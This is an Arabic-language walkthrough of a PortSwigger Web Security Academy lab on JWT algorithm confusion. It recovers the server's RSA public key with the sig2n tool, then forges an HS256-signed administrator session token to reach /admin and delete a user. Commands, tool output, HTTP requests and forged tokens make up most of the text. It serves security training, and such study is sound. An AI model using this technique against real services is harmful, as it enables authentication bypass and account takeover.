# [JWT authentication bypass via algorithm confusion with no exposed key](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key)

## **`الهدف`**
قم بالحصول على المفتاح العام الخاص بالسيرفر ثم استعمله لتوقيع `Session Token` معدل يسمح لك بالوصول إلى لوحة التحكم في `/admin` ثم حذف حساب `carlos`.
## **`خطوات الحل`**
نقوم بالدخول إلى حساب `wiener:peter` ونقوم بنسخ الـ `JWT` من أى `request` والاحتفاظ به في ملف نصي، ثم نقوم بتسجيل الخروج ثم تسجيل الدخول مرة أخرى ونقوم بنسخ الـ `JWK` الجديد من أى `request`.

بعد ذلك سنقوم بتثبيت برنامج `Docker` ، ثم نقوم بكتابة هذه الأوامر في الـ `PowerShell` أو `Terminal` حسب نوع نظام التشغيل.

لتحميل الأداة لأول مرة فقط
```Shell
docker pull portswigger/sig2n
```

في كل مرة عند استعمال الأداة مع مراعاة أن يكون `Docker` مفتوح بالخلفية، ونضغ التوكنز التي قمنا بنسخها فى أماكنها داخل علامات التنصيص.
```Shell
docker run --rm -it portswigger/sig2n "TOKEN1" "TOKEN2"
```

وستكون النتيجة كالتالي:
```
Found n with multiplier 1:
    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUJSZVREWHhOKzNiL2Q1R0JPTGppdQo0T0N6RWpyS0lkQ01FSFY3aWFaUXBndGV2blBtaVFadytObHl3My81RzhMaSsxWmdoeEFQazVnZUYxK3g5Rmw3Ci9MOG01ekYvTDE4RDVIU0ZBaG1zNjVUM0k2dFFTTkxGSWNVN3FpRmU3U0k1T0J6RXdFQTNtMG1US0FxVjBCMWoKc2tKOEsvR0NlU29EenNVMEVjcjVYRUNjZzZqbjhtS2ZnVFNPYzlxVEVvcU5yc2NFa3JRR2NVaEMxZUtES09xKwpTVExVRVRjdTY0NTZsWElRR2t0VENsR21wMUJ0R3VYVWoxeXdtdXJWR0hodk1DckNVUTNwbldtcU94elJLQzNmCnZjWEVuYnlqRzZ4dEQzd2x1ZFBUNVdzQ0Evak1MR2lIbDlSYSs3ZjF1aEhGMzNLbXdlUGY5akxXSWd3MDV1SjIKemdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJraWQiOiI1OWQ1NWYyNS1mYjFlLTRkNWMtODJmYy03NDU2MzEyNzkzNWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc4NTkxMTg4NywgInN1YiI6ICJ3aWVuZXIifQ.jTE9tZONYLCmW0BlHNQ8Q2aMCmrr7-9O94Ihe_htURM
    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQlJlVERYeE4rM2IvZDVHQk9Maml1NE9DekVqcktJZENNRUhWN2lhWlFwZ3Rldm5QbWlRWncKK05seXczLzVHOExpKzFaZ2h4QVBrNWdlRjEreDlGbDcvTDhtNXpGL0wxOEQ1SFNGQWhtczY1VDNJNnRRU05MRgpJY1U3cWlGZTdTSTVPQnpFd0VBM20wbVRLQXFWMEIxanNrSjhLL0dDZVNvRHpzVTBFY3I1WEVDY2c2am44bUtmCmdUU09jOXFURW9xTnJzY0VrclFHY1VoQzFlS0RLT3ErU1RMVUVUY3U2NDU2bFhJUUdrdFRDbEdtcDFCdEd1WFUKajF5d211clZHSGh2TUNyQ1VRM3BuV21xT3h6UktDM2Z2Y1hFbmJ5akc2eHREM3dsdWRQVDVXc0NBL2pNTEdpSApsOVJhKzdmMXVoSEYzM0ttd2VQZjlqTFdJZ3cwNXVKMnpnSURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
    Tampered JWT: eyJraWQiOiI1OWQ1NWYyNS1mYjFlLTRkNWMtODJmYy03NDU2MzEyNzkzNWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc4NTkxMTg4NywgInN1YiI6ICJ3aWVuZXIifQ.uebrdFL2Ixs9YEdkczjZk1fzR_u27XLhojSipA0RDwU

Found n with multiplier 2:
    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFvdkpocjRtL2J0L3U4akFuRnh4WApjSEJaaVIxbEVPaEdDRHE5eE5Nb1V3V3ZYem56UklNNGZHeTVZYi84amVGeGZhc3dRNGdIeWN3UEM2L1kraXk5Ci9sK1RjNWkvbDYrQjhqcENnUXpXZGNwN2tkV29KR2xpa09LZDFSQ3ZkcEVjbkE1aVlDQWJ6YVRKbEFWSzZBNngKMlNFK0ZmakJQSlVCNTJLYUNPVjhyaUJPUWRSeitURlB3SnBIT2UxSmlVVkcxMk9DU1ZvRE9LUWhhdkZCbEhWZgpKSmxxQ0p1WGRjYzlTcmtJRFNXcGhTalRVNmcyalhMcVI2NVlUWFZxakR3M21CVmhLSWIwenJUVkhZNW9sQmJ2CjN1TGlUdDVSamRZMmg3NFMzT25wOHJXQkFmeG1GalJEeStvdGZkdjYzUWppNzdsVFlQSHYreGxyRVFZYWMzRTcKWndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJraWQiOiI1OWQ1NWYyNS1mYjFlLTRkNWMtODJmYy03NDU2MzEyNzkzNWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc4NTkxMTg4NywgInN1YiI6ICJ3aWVuZXIifQ.-AIi1RrjFqbLu3bra3YO01FjUdy0ENFk5ByzOD69zx0
    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQW92SmhyNG0vYnQvdThqQW5GeHhYY0hCWmlSMWxFT2hHQ0RxOXhOTW9Vd1d2WHpuelJJTTQKZkd5NVliLzhqZUZ4ZmFzd1E0Z0h5Y3dQQzYvWStpeTkvbCtUYzVpL2w2K0I4anBDZ1F6V2RjcDdrZFdvSkdsaQprT0tkMVJDdmRwRWNuQTVpWUNBYnphVEpsQVZLNkE2eDJTRStGZmpCUEpVQjUyS2FDT1Y4cmlCT1FkUnorVEZQCndKcEhPZTFKaVVWRzEyT0NTVm9ET0tRaGF2RkJsSFZmSkpscUNKdVhkY2M5U3JrSURTV3BoU2pUVTZnMmpYTHEKUjY1WVRYVnFqRHczbUJWaEtJYjB6clRWSFk1b2xCYnYzdUxpVHQ1UmpkWTJoNzRTM09ucDhyV0JBZnhtRmpSRAp5K290ZmR2NjNRamk3N2xUWVBIdit4bHJFUVlhYzNFN1p3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
    Tampered JWT: eyJraWQiOiI1OWQ1NWYyNS1mYjFlLTRkNWMtODJmYy03NDU2MzEyNzkzNWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc4NTkxMTg4NywgInN1YiI6ICJ3aWVuZXIifQ.cJjw0PbzXqw4Fgu8cxjpY0ueW85fpUe_cM6vHvC-PUE
```

بعد ذلك سنقوم بالذهاب إلى `Burp` وتحويل أى `request` مثل `/my-account?id=wiener` إلى `repeater`
```http
GET /my-account?id=wiener HTTP/2
Host: 0a41002f035f85fe80943a0b0007002f.web-security-academy.net
Cookie: session=eyJraWQiOiI1OWQ1NWYyNS1mYjFlLTRkNWMtODJmYy03NDU2MzEyNzkzNWUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NTgyODk1OSwic3ViIjoid2llbmVyIn0.HEGH1_cXoCCV2Uw0NSQ6I2YzytVwBeg4PIbwlLWgbjWG_jt_FoAFWgk2xEEL1y5_SbQcwx6BYty16xcYjZYuLYZmTyq43pP3JZjcNuroMMOFJQ2huClq41Pd0rTgETmGSvPEo2gUxGl5Wg0pjYvpaw0paw8-NlsKJZn_Jae1g743v8UZjQKyRjTQD9om30D0Gl8Xqk9EAlR-q67USWRsk7luQXI10Bu3rxysGhQnnrrtybfhBnZbUvK157lMgxKntMsqFAapsOBumoTYvk_BvjQfYx20goMiXOpiNoCw8w3B7k432DXdPcb3P0wPLY7j7RvYRUgODLUm1MICAS1tIQ
```

والأن سنقوم بتجربة تبديل قيمة الـ `Cookie` بقيم `Tampered JWT` من نتائج الأدة واحدًا بواحد حتى نصل إلى الـ `JWK` صاحب القيمة الصحيح والذي سنجد أنه هذا
```Tampered-JWT
eyJraWQiOiI1OWQ1NWYyNS1mYjFlLTRkNWMtODJmYy03NDU2MzEyNzkzNWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc4NTkxMTg4NywgInN1YiI6ICJ3aWVuZXIifQ.-AIi1RrjFqbLu3bra3YO01FjUdy0ENFk5ByzOD69zx0
```

لذلك سنقوم بنسخ `Base64 encoded x509 key` التابع له
```Base64-encoded-x509-key
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFvdkpocjRtL2J0L3U4akFuRnh4WApjSEJaaVIxbEVPaEdDRHE5eE5Nb1V3V3ZYem56UklNNGZHeTVZYi84amVGeGZhc3dRNGdIeWN3UEM2L1kraXk5Ci9sK1RjNWkvbDYrQjhqcENnUXpXZGNwN2tkV29KR2xpa09LZDFSQ3ZkcEVjbkE1aVlDQWJ6YVRKbEFWSzZBNngKMlNFK0ZmakJQSlVCNTJLYUNPVjhyaUJPUWRSeitURlB3SnBIT2UxSmlVVkcxMk9DU1ZvRE9LUWhhdkZCbEhWZgpKSmxxQ0p1WGRjYzlTcmtJRFNXcGhTalRVNmcyalhMcVI2NVlUWFZxakR3M21CVmhLSWIwenJUVkhZNW9sQmJ2CjN1TGlUdDVSamRZMmg3NFMzT25wOHJXQkFmeG1GalJEeStvdGZkdjYzUWppNzdsVFlQSHYreGxyRVFZYWMzRTcKWndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
```

ونذهب إلى إضافة `JWT Editior` ونقوم بإضافة `New Symmetric Key` ونضغط `Generate`. ثم نقوم بوضع النص الذي قمنا بنسخه فى معلم `k` لتصبح مكونات المفتاح كالتالي:
```JSON
{  
    "kty": "oct",  
    "kid": "dab6845a-f084-496d-aa35-cade823a34c1",  
    "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFvdkpocjRtL2J0L3U4akFuRnh4WApjSEJaaVIxbEVPaEdDRHE5eE5Nb1V3V3ZYem56UklNNGZHeTVZYi84amVGeGZhc3dRNGdIeWN3UEM2L1kraXk5Ci9sK1RjNWkvbDYrQjhqcENnUXpXZGNwN2tkV29KR2xpa09LZDFSQ3ZkcEVjbkE1aVlDQWJ6YVRKbEFWSzZBNngKMlNFK0ZmakJQSlVCNTJLYUNPVjhyaUJPUWRSeitURlB3SnBIT2UxSmlVVkcxMk9DU1ZvRE9LUWhhdkZCbEhWZgpKSmxxQ0p1WGRjYzlTcmtJRFNXcGhTalRVNmcyalhMcVI2NVlUWFZxakR3M21CVmhLSWIwenJUVkhZNW9sQmJ2CjN1TGlUdDVSamRZMmg3NFMzT25wOHJXQkFmeG1GalJEeStvdGZkdjYzUWppNzdsVFlQSHYreGxyRVFZYWMzRTcKWndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="  
}
```
ثم نضغط `OK` لنحفظه، وبعد ذلك نذهب إلى مسار `/admin` ولكن سنقوم باعتراض هذا الـ `request` ونقله إلى `repeater`
```http
GET /admin HTTP/2
Host: 0a41002f035f85fe80943a0b0007002f.web-security-academy.net
Cookie: session=eyJraWQiOiI1OWQ1NWYyNS1mYjFlLTRkNWMtODJmYy03NDU2MzEyNzkzNWUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NTgyODk1OSwic3ViIjoid2llbmVyIn0.HEGH1_cXoCCV2Uw0NSQ6I2YzytVwBeg4PIbwlLWgbjWG_jt_FoAFWgk2xEEL1y5_SbQcwx6BYty16xcYjZYuLYZmTyq43pP3JZjcNuroMMOFJQ2huClq41Pd0rTgETmGSvPEo2gUxGl5Wg0pjYvpaw0paw8-NlsKJZn_Jae1g743v8UZjQKyRjTQD9om30D0Gl8Xqk9EAlR-q67USWRsk7luQXI10Bu3rxysGhQnnrrtybfhBnZbUvK157lMgxKntMsqFAapsOBumoTYvk_BvjQfYx20goMiXOpiNoCw8w3B7k432DXdPcb3P0wPLY7j7RvYRUgODLUm1MICAS1tIQ
```

ونستعمل `Inspector` ونقوم بتظليل الجزء الخاص بالـ `Payload` في الـ `Session token` ونقوم بتعديل اسم `wiener` إلى `administrator`، ونقوم بتعديل معلم `alg` في الـ `Header` من `RS256` إلى `HS256` ثم نضغط على إختيار `JSON Web Token` ونقوم بالضغط على `Sign` مع التأكيد على إختيار `Don't modify header` ونقوم بإرسال الـ `request` لنتأكد من صحة الـ `response.

ثم سنقوم بنسخ كامل الـ `Session token` بعد التعديل، ونقوم بالذهاب إلى المتصفح داخل اللاب والضغط على `F12` ووضعها بدلًا من القديمة وعمل `refresh` للصفحة، ونستطيع بعد ذلك الدخول مرة أخرى إلى `/admin` وحذف حساب `carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع اللاب السابق` [JWT authentication bypass via algorithm confusion](./JWT-authentication-bypass-via-algorithm-confusion.md)
